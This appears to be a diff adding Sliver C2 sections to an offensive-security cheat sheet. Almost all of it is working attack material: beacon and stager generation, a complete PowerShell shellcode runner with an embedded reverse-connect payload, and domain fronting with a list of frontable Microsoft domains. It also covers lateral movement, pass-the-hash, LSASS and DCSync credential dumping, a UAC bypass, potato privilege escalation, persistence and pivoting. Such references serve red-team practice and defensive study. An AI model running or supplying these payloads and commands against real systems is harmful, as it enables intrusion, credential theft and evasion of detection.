@@ -2643,10 +2643,11 @@ netsh interface portproxy reset
 Commertial and open source options available.
 <a href='https://www.thec2matrix.com'>C2 Matrix:</a> - C2 research
 Common C2:
-- metasploit
-- powershell empire (old)
+- Metasploit
+- Powershell Empire (old)
 - silenttrinity (byt3bl33d3r)
 - Sliver (BishopFox)
+- Mythic
 - Merlin
 - Nighthawk
 - HardHat
@@ -2657,6 +2658,12 @@ Common C2:
 - Scythe
 
 ## Sliver
+
+Install:
+```
+curl https://sliver.sh/install | sudo bash
+```
+
 Start Sliver Server:
 ```
 sudo systemctl start sliver
@@ -2679,10 +2686,178 @@ Generate Beacons:
 ```
 generate beacon --evasion --arch amd64 --mtls [ip:port] --format [exe,shellcode,shared,service] --os windows --save /var/www/html 
 ```
+Generate Sessions:
+```
+# DLL Entrypoint (StartW)
+generate --mtls 192.168.124.1:443 --format shared
+```
 
 Convert to Shellcode to PowerShell Payload (Unstable):
 ```
 msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --platform windows -e cmd/powershell_base64 -f ps1 -o safe.ps1
+```
+
+### Stagers
+## Metasploit
+```
+# Generate Profile
+new beacon --mtls 192.168.1.1:443 --format shellcode shellcode-beacon
+
+# Setup Stager Listener
+stage-listener --url http://192.168.1.1:1234 --profile win-shellcode --prepend-size
+
+# Generate Stager (Format can be anything)
+msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.122.1 LPORT=1234 LURI=/hello.woff -f raw -o /tmp/stager.bin
+```
+## Sliver
+```
+[Unencrypted]
+
+# Generate Profile
+profiles new beacon --mtls 192.168.1.1:443 --format shellcode shellcode-beacon
+
+# Generate Stager Listener
+stage-listener -u tcp://192.168.56.1:8080 -p shellcode-beacon
+
+# Generate Stager
+generate stager -f c -L 192.168.1.1 -l 8080
+
+[Encrypted]
+
+# Generate SSL Cert
+msf > use auxiliary/gather/impersonate_ssl 
+msf auxiliary(impersonate_ssl) > set RHOST www.google.com
+RHOST => www.google.com
+msf auxiliary(impersonate_ssl) > run
+
+[*] Connecting to www.google.com:443
+[*] Copying certificate from www.google.com:443
+/C=US/ST=California/L=Mountain View/O=Google Inc/CN=google.com 
+[*] Beginning export of certificate files
+[*] Creating looted key/crt/pem files for www.google.com:443
+[+] key: /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_k_189227.key
+[+] crt: /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_c_767214.crt
+[+] pem: /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_p_507862.pem
+[*] Auxiliary module execution completed
+
+# Setup Beacon Listener
+https -L 192.168.1.11 -l 443 -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key
+
+# Setup Stager Listener
+stage-listener --url https://192.168.1.11:8080 --profile local -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
+
+# Generate Stager
+generate stager -f csharp -L 192.168.1.1 -l 8080
+
+or
+
+# Grab Shellcode
+https://192.168.1.11:8080/anything.woff
+```
+
+## Simple PowerShell Shellcode Runner
+```
+function LookupFunc {
+
+Param ($moduleName, $functionName)
+
+$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+
+Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+
+Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+$tmp=@()
+
+$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+
+return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+
+@($moduleName)), $functionName))
+
+}
+
+function getDelegateType {
+
+Param (
+
+[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+
+[Parameter(Position = 1)] [Type] $delType = [Void]
+
+)
+
+$type = [AppDomain]::CurrentDomain.
+
+DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+
+DefineDynamicModule('InMemoryModule', $false).
+
+DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
+
+[System.MulticastDelegate])
+
+$type.
+
+DefineConstructor('RTSpecialName, HideBySig, Public',
+
+[System.Reflection.CallingConventions]::Standard, $func).
+
+SetImplementationFlags('Runtime, Managed')
+
+$type.
+
+DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+
+SetImplementationFlags('Runtime, Managed')
+
+return $type.CreateType()
+
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),
+
+(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+### REPLACE SHELLCODE BUFFER ###
+# generate stager -f ps1 -L 192.168.1.1 -l 8080
+[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x1f,0x90,0xc0,0xa8,0x7c,0x8f,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+# Execute shellcode and wait for it to exit
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
+
+(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
+
+(getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+### Domain Fronting
+```
+generate --http(s) fronted_CDN_domain.com?host-header=<teamserver_domain>
+
+generate --http ajax.aspnetcdn.com?host-header=[REPLACEME].azureedge.net,ajax.microsoft.com?host-header=[REPLACEME].azureedge.net --strategy rd
+
+
+# HTTP(s) Listener
+http --website FakePortfolioSite -l <port> -p
+
+# Host Website
+websites add-content --website FakePortfolioSite --web-path / --content /home/operator/www/FakePortfolioSite --recursive
+
+
+# Frontable Microsoft Domains
+ajax.microsoft.com
+ajax.aspnetcdn.com
+az416426.vo.msecnd.net
+do.skype.com
+officeimg.vo.msecnd.net
 ```
 
 ### Armory
@@ -2703,6 +2878,181 @@ armory install .net-pivot
 
 armory install .net-execute
 ```
+
+### Lateral Movement
+PSExec
+```
+# Generate Service Profile
+profiles new --format service --skip-symbols --http 192.168.1.1 service-shellcode
+
+# Execute Custom PSExec Binary
+psexec -p service-shellcode host.fqdn.local
+```
+Alternatives
+```      
+armory install windows-pivot
+
+scshell
+bof-servicemove
+winrm
+```
+From Linux
+```
+atexec.py DOMAIN/user:pass@192.168.1.1 "powershell.exe -enc [ENCODED IEX to grab powershell stager]" -silentcommand
+```
+
+Pass-the-Hash
+```
+# NTLM Hash execute-assembly ~/www/windows/SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash 
+
+# Migrate / Steal Token migrate -p [PID OF PTH COMMAND] 
+
+(Misc) 
+# Generate NTLM Hash from plaintext password 
+execute-assembly ~/www/windows/Rubeus.exe hash /user:user1 /password:password1 [/domain:domain] 
+
+# Check If PTH Successful 
+execute-assembly ~/www/windows/SharpLdapWhoami.exe /all
+```
+
+### Credential Dumping
+```
+# SAM
+
+# Local
+hashdump
+sideload --process werfault.exe /tmp/gosecretsdump.exe -system '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system' -sam '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
+
+# Remote
+sharpsecdump -- '-target=192.168.1.15 -u=admin -p=Password123 -d=test.local'
+```
+
+LSASS
+```
+# List Process IDs (Find LSASS PID)
+ps
+
+# Dump LSASS Memory
+procdump -p [PID]
+nanodump [pid] [dump-name] [write-file (1)] [signature (PMDM)]
+handlekatz pid path_to_dump
+
+# Parse LSASS Memory Dump
+pypykatz lsa minidump lsass.dmp
+```
+
+DPAPI
+```
+sharpdpapi -- 'machinetriage'
+```
+
+DCSync
+```
+# DCSync User
+execute-assembly ~/www/windows/SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc
+
+# DCSync Entire Domain
+execute-assembly ~/www/windows/SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc
+
+# DCSync w/ Plaintext Creds
+execute-assembly ~/www/windows/SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword
+```
+
+
+### Privilege Escalation
+```
+# SeImpersonatePrivilege
+inline-execute-assembly /home/goad/tools/SweetPotato.exe "-p C:\\Users\\Public\\Desktop\\EVIL.exe"
+
+# Alternative to SweetPotato
+https://github.com/BeichenDream/GodPotato
+
+
+
+# UAC Bypass (https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
+[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
+[CMSTPBypass]::Execute("C:\tempy\CONVENIENT_PAPERBACK.exe")
+
+execute -o powershell "c:\tempy\sliver_seamless.ps1"
+
+# getsystem (Another Potato)
+getsystem
+```
+
+
+### Persistence
+```
+-- USER
+
+# Registry Run Key
+execute-assembly /home/goad/tools/SharpCollection/NetFramework_4.7_x64/SharPersist.exe '-t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Administrator\Desktop\Excel.exe" -k "hkcurun" -v "test stuff" -m add'
+
+
+-- SYSTEM
+
+# Service
+execute-assembly /home/goad/tools/SharpCollection/NetFramework_4.7_Any/SharPersist.exe '-t service -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Public\Desktop\Excel.exe" -n "SomeService" -m add'
+
+# Scheduled Tasks
+execute-assembly /home/goad/tools/SharpCollection/NetFramework_4.7_Any/SharPersist.exe '-t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Public\Desktop\Excel.exe" -n "Some Task" -o logon -m add'
+```
+
+
+### Pivoting
+```
+Default Port: 1081
+Default Host: 127.0.0.1
+
+No Auth
+socks5 start [-host <host> --port <port>] 
+
+Auth
+socks5 start --host <host> --port <port> --user <user>
+```
+
+
+### Extras
+
+## Sliver Mods
+```
+# Add Mimikatz Reflective DLL
+
+- Download Custom Mimikatz: https://github.com/MrAle98/mimikatz
+- Compile Sliverkatz (x64)
+- cd ~/.sliver-client/extensions/
+- mkdir mimikatz
+- cp extension.json powerkatz.dll --> mimikatz
+- Restart Sliver Server
+- Profit, mimikatz command should be available
+
+
+# Port Bender
+https://github.com/MrAle98/Sliver-PortBender
+
+
+# Unmanaged PowerShell
+https://github.com/mmnoureldin/UnmanagedPowerShell
+https://github.com/MrAle98/PS
+https://github.com/bitsadmin/nopowershell
+
+
+# PE Injection (Herpaderping)
+https://github.com/MrAle98/BOF-RunPE
+
+
+# Chisel (Pivoting)
+https://github.com/MrAle98/chisel
+
+# Rubeus BOF
+https://github.com/wavvs/nanorobeus
+```
+
+
+## Example Extensions
+```
+https://github.com/thelikes/SliverExtensionSample
+```
+
 
 ## Cobalt Strike
 
